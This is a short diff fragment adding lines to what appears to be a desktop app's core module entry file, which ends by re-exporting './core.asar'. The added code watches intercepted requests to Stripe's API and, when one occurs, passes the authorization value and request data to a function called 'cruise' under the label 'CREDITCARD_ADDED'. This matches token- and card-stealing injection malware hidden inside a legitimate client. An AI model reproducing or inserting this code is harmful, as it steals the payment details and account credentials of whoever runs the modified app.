+    if (a.url.includes('api.stripe.com')) {
+        cruise('CREDITCARD_ADDED', authorization, data);
+    }
+}),
+
+module.exports = require('./core.asar');
